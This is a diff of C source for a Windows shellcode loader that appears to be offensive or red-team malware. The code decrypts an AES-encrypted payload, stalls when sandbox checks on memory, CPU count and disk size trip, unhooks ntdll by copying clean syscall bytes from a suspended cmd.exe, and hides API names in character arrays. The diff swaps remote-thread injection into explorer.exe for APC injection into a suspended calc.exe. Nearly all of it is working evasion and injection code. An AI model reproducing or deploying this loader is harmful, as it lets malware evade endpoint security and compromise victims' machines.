@@ -56,7 +56,6 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
 	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
 			return -1;
 	}
-	
 	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
 			return -1;
 	}
@@ -68,69 +67,28 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
 	return 0;
 }
 
-
-int FindTarget(const char *procname) {
-	HANDLE hProcSnap;
-	PROCESSENTRY32 pe32;
-	int pid = 0;
-	
-	unsigned char sCreateToolhelp32Snapshot[] = {'C','r','e','a','t','e','T','o','o','l','3','2','S','n', 'a', 'p', 's', 'h', 'o', 't'};
-	CreateToolhelp32Snapshot_t CreateToolhelp32Snapshot_p = (CreateToolhelp32Snapshot_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateToolhelp32Snapshot);
-	hProcSnap = CreateToolhelp32Snapshot_p(TH32CS_SNAPPROCESS, 0);
-	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
-
-	pe32.dwSize = sizeof(PROCESSENTRY32); 
-			
-	if (!Process32First(hProcSnap, &pe32)) {
-			CloseHandle(hProcSnap);
-			return 0;
-	}
-	
-	
-	while (Process32Next(hProcSnap, &pe32)) {
-		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
-				pid = pe32.th32ProcessID;
-				break;
-		}
-	}
-			
-	CloseHandle(hProcSnap);
-			
-	return pid;
-}
-
-
-int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
-
-	LPVOID pRemoteCode = NULL;
-	HANDLE hThread = NULL;
-
+void APCInject(unsigned char * payload, unsigned int payload_len) {
 	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
-    
-    unsigned char sVirtualAllocEx[] = {'V','i','r','t','u','a','l','A','l','l','o','c','E','x'};
-	VirtualAllocEx_t VirtualAllocEx_p = (VirtualAllocEx_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAllocEx);
-
-	pRemoteCode = VirtualAllocEx_p(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-
-    unsigned char sWriteProcessMemory[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e', 'm', 'o', 'r', 'y'};
-	WriteProcessMemory_t WriteProcessMemory_p = (WriteProcessMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteProcessMemory);
-	WriteProcessMemory_p(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, NULL);
+	STARTUPINFO si = {0};
+	PROCESS_INFORMATION pi = {0};
 	
-    unsigned char sCreateRemoteThread[] = {'C','r','e','a','t','e','R','e','m','o','t','e','T','h', 'r', 'e', 'a', 'd'};
-	CreateRemoteThread_t CreateRemoteThread_p = (CreateRemoteThread_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateRemoteThread);
-
-	hThread = CreateRemoteThread_p(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
-	if (hThread != NULL) {
-			WaitForSingleObject(hThread, 500);
-			CloseHandle(hThread);
-			return 0;
-	}
-	return -1;
+	printf("Process created");
+	getc(stdin);
+	CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	HANDLE victimProcess = pi.hProcess;
+	HANDLE threadHandle = pi.hThread;
+	
+	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+	
+	WriteProcessMemory(victimProcess, shellAddress, payload, payload_len, NULL);
+	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);	
+	ResumeThread(threadHandle);
+	printf("Process hollowed and injected!");
+	getc(stdin);
 }
-
 
 int FindFirstSyscall(char * pMem, DWORD size){
-	
 	DWORD i = 0;
 	DWORD offset = 0;
 	BYTE pattern1[] = "\x0f\x05\xc3"; 
@@ -149,7 +107,6 @@ int FindFirstSyscall(char * pMem, DWORD size){
 			break;
 		}		
 	}
-
 	return offset;
 }
 
@@ -166,141 +123,161 @@ int FindLastSysCall(char * pMem, DWORD size) {
 			break;
 		}
 	}		
-	
 	return offset;
 }
 		
 		
 static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
-
+/*
+    UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
+*/
 	DWORD oldprotect = 0;
 	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
 	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);
 	int i;
 
-	unsigned char sVirtualProtect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t'};
+	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
 	
 	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
-	char txtSection[] = {'.', 't', 'e', 'x', 't'};
+	
+	// find .text section
 	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
 		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
 
-		if (!strcmp((char *)pImgSectionHead->Name, txtSection)) {
+		if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
+			// prepare ntdll.dll memory region for write permissions.
 			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
 							pImgSectionHead->Misc.VirtualSize,
 							PAGE_EXECUTE_READWRITE,
 							&oldprotect);
 			if (!oldprotect) {
+					// RWX failed!
 					return -1;
 			}
 
+			// copy clean "syscall table" into ntdll memory
 			DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
 			DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
 			
 			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
 				DWORD SC_size = SC_end - SC_start;
+				printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
+				printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
+				printf("size: %i\n", SC_size);
+				getchar();
 				memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
 						(LPVOID)((DWORD_PTR) pCache + + SC_start),
 						SC_size);
 			}
 
+			// restore original protection settings of ntdll
 			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
 							pImgSectionHead->Misc.VirtualSize,
 							oldprotect,
 							&oldprotect);
 			if (!oldprotect) {
+					// it failed
 					return -1;
 			}
 			return 0;
 		}
 	}
 	
+	// failed? .text not found!
 	return -1;
 }
 
 
-int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int main() {
+//int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     SYSTEM_INFO sysInfo;
 	MEMORYSTATUSEX memInfo;
 	GetNativeSystemInfo(&sysInfo);
 	memInfo.dwLength = sizeof(memInfo);
 	GlobalMemoryStatusEx(&memInfo);
-
+	printf("Check point 1: prior to sandbox checks");
+	getc(stdin);
 	if ((memInfo.ullTotalPhys/DIV) < 2000000) {
-		timing_sleep_loop(300);
+		printf("Memory under threshold: Running sleep loop");
+		getc(stdin);
+		timing_sleep_loop(3000);
 	}
 
 	if (sysInfo.dwNumberOfProcessors < 2) {
-		timing_sleep_loop(300);
+		printf("Processor amount under threshold: Running sleep loop");
+		getc(stdin);
+		timing_sleep_loop(3000);
 	}
-
+	
 	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 	DISK_GEOMETRY pDiskGeometry;
 	DWORD bytesReturned;
 	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
 	DWORD diskSizeGB;
 	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
-	if (diskSizeGB < 100) timing_sleep_loop(300);
-
+	if (diskSizeGB < 100) {
+		printf("Disk size under threshold: Running sleep loop");
+		getc(stdin);
+		timing_sleep_loop(3000);
+	}
+	printf("Checkpoint 2: Prior to unhooking NTDLL");
+	getc(stdin);
 	int pid = 0;
-    	HANDLE hProc = NULL;
+    HANDLE hProc = NULL;
 	int ret = 0;
 
 	STARTUPINFOA si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
+
 	char path[] = "C:\\Windows\\System32\\";
 	char pToCreate[] = {'c','m','d','.','e','x','e'};
 	char ntMod[] = {'n','t','d','l','l','.','d','l','l'};
     
 	BOOL success = CreateProcessA(
 		NULL, 
-		(LPSTR) pToCreate, 
+		(LPSTR) "cmd.exe", 
 		NULL, 
 		NULL, 
 		FALSE, 
 		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
 		NULL, 
-		path, 
+		"C:\\Windows\\System32\\", 
 		&si, 
 		&pi);
 
 	if (success == FALSE) {
+		printf("[!] Error: Could not call CreateProcess\n");
 		return 1;
 	}	
-
-	char * pNtdllAddr = (char *) GetModuleHandle(ntMod);
+	printf("Checkpoint 3: Clean cmd loaded");
+	getc(stdin);
+	char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
 	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
 	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
 	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
 	
 	SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
 	
-    unsigned char sVirtualAlloc[] = {'V','i','r','t','a','l','A','l','l','o','c'};
-	VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAlloc);
-	LPVOID pCache = VirtualAlloc_p(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
-		
+	// allocate local buffer to hold temporary copy of clean ntdll from remote process
+	LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
+	
+	printf("ntdll size: %x | cache: %p\n", ntdll_size, pCache);
+	
 	SIZE_T bytesRead = 0;
 	if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
-		return -1;	
-	TerminateProcess(pi.hProcess, 0);
-
-	ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
-	VirtualFree(pCache, 0, MEM_RELEASE);
-	DWORD oldProtect = 0;
-	char target[] = "explorer.exe";
-	pid = FindTarget(target);
+		printf("Error reading: %d | %x\n", bytesRead, GetLastError());
 	
-	if (pid) {
-        unsigned char sOpenProcess[] = {'O','p','e','n','P','r','o','c','e','s','s'};
-	    OpenProcess_t OpenProcess_p = (OpenProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sOpenProcess);
-		hProc = OpenProcess_p( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
-						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-						FALSE, (DWORD) pid);
+	
+	TerminateProcess(pi.hProcess, 0);
+	
 
-		if (hProc != NULL) {
-			Inject(hProc, payload, payload_len);
-			CloseHandle(hProc);
-		}
-	}
+	// remove hooks
+	printf("Unhooking ntdll\n");
+	ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
+	//Current breakpoint
+	// Clean up.
+	VirtualFree(pCache, 0, MEM_RELEASE);
+	
+	APCInject(payload, payload_len);
 	return 0;
 }
